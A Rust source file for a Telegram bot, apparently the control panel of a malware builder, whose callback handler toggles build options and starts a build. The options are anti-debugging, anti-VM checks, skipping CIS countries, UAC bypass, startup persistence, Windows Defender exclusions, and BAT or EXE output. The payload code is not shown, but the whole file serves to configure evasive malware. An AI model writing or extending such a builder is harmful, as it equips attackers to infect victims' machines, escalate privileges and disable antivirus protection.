use teloxide::{prelude::*, types::CallbackQuery};
use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use crate::telegram_bot::{Sessions, UserSession};

// Callback query handler for inline keyboard buttons
pub async fn callback_handler(
    bot: Bot,
    q: CallbackQuery,
    sessions: Sessions,
) -> ResponseResult<()> {
    let chat_id = q.message.as_ref().unwrap().chat.id;
    
    // Answer the callback query to remove the "loading" state
    bot.answer_callback_query(&q.id).await?;

    let data = match q.data {
        Some(ref data) => data.as_str(),
        None => return Ok(()),
    };

    match data {
        "toggle_anti_debug" => {
            toggle_option(&sessions, chat_id, |config| config.anti_debug = !config.anti_debug);
        }
        "toggle_anti_vm" => {
            toggle_option(&sessions, chat_id, |config| config.anti_virtual_machine = !config.anti_virtual_machine);
        }
        "toggle_blacklist_cis" => {
            toggle_option(&sessions, chat_id, |config| config.blacklist_cis_countries = !config.blacklist_cis_countries);
        }
        "toggle_uac_bypass" => {
            toggle_option(&sessions, chat_id, |config| config.uac_bypass = !config.uac_bypass);
        }
        "toggle_single_instance" => {
            toggle_option(&sessions, chat_id, |config| config.single_instance = !config.single_instance);
        }
        "toggle_persistence" => {
            toggle_option(&sessions, chat_id, |config| config.run_on_startup = !config.run_on_startup);
        }
        "toggle_defender" => {
            toggle_option(&sessions, chat_id, |config| config.defender_exclusion = !config.defender_exclusion);
        }
        "toggle_drive_exclusion" => {
            toggle_option(&sessions, chat_id, |config| config.defender_exclude_drive = !config.defender_exclude_drive);
        }
        "toggle_format" => {
            toggle_option(&sessions, chat_id, |config| {
                config.file_extension = if config.file_extension == "BAT" {
                    "EXE".to_string()
                } else {
                    "BAT".to_string()
                };
            });
        }
        "start_build" => {
            // Start the build process
            crate::telegram_bot::start_build_process(bot.clone(), chat_id, sessions.clone()).await?;
            return Ok(());
        }
        _ => {}
    }

    // Refresh the menu with updated button states
    crate::telegram_bot::show_config_menu(bot, chat_id, sessions).await?;

    Ok(())
}

// Helper function to toggle an option
fn toggle_option<F>(sessions: &Sessions, chat_id: ChatId, toggle_fn: F)
where
    F: FnOnce(&mut crate::telegram_bot::BuildConfig),
{
    let mut sessions_lock = sessions.lock().unwrap();
    if let Some(session) = sessions_lock.get_mut(&chat_id) {
        toggle_fn(&mut session.config);
    }
}
